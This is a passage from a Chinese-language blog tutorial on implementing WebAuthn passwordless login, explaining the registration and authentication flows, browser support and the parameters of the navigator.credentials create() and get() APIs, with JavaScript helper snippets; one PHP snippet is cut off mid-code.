和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\n    publicKey: {\n        challenge,\n        rp: {\n            id,\n            name\n        },\n        user: {\n            id,\n            name,\n            displayName\n        },\n        pubKeyCredParams: [\n            {\n                type: \"public-key\",\n                alg\n            }\n        ],\n        authenticatorSelection: {\n            authenticatorAttachment,\n            userVerification\n        },\n        excludeCredentials: [\n            {\n                id,\n                transports: [],\n                type: \"public-key\"\n            }\n        ],\n        timeout\n    }\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\n    rawId: ArrayBuffer(32) {},\n    response: AuthenticatorAttestationResponse {\n        attestationObject: ArrayBuffer(390) {},\n        clientDataJSON: ArrayBuffer(121) {}\n    },\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\n    type: \"public-key\"\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\n    publicKey: {\n        challenge,\n        rpId,\n        userVerification,\n        allowCredentials: [\n            {\n                id,\n                transports: [],\n                type: \"public-key\"\n            }\n        ],\n        timeout\n    }\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\n    rawId: ArrayBuffer(32) {},\n    response: AuthenticatorAssertionResponse {\n        authenticatorData: ArrayBuffer(37) {},\n        signature: ArrayBuffer(256) {},\n        userHandle: ArrayBuffer(64) {},\n        clientDataJSON: ArrayBuffer(118) {}\n    }\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\n    type: \"public-key\"\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\n    challenge, // 自行设置\n    rp, // 自行设置\n    user, // 自行设置\n    pubKeyCredParams: [\n        {\n            type: \"public-key\",\n            alg: -7 // ES256\n        },\n        {\n            type: \"public-key\",\n            alg: -257 // RS256\n        }\n    ],\n    authenticatorSelection: {\n        userVerification: \"discouraged\",\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\n    },\n    excludeCredentials, // 自行设置\n    timeout: 60000\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\n    return window.btoa(String.fromCharCode(...a));\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\n    const publicKeyCredential = {\n        id: credentialInfo.id,\n        type: credentialInfo.type,\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\n        response: {\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\n        }\n    };\n    return publicKeyCredential;\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\n    // 可以发送了\n}).catch((error) =&gt; {\n    console.warn(error); // 捕获错误\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\n    publicKey: {\n        rp: {\n            icon\n        },\n        user: {\n            icon\n        },\n        attestation,\n        authenticatorSelection: {\n            requireResidentKey\n        },\n        extensions\n    }\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 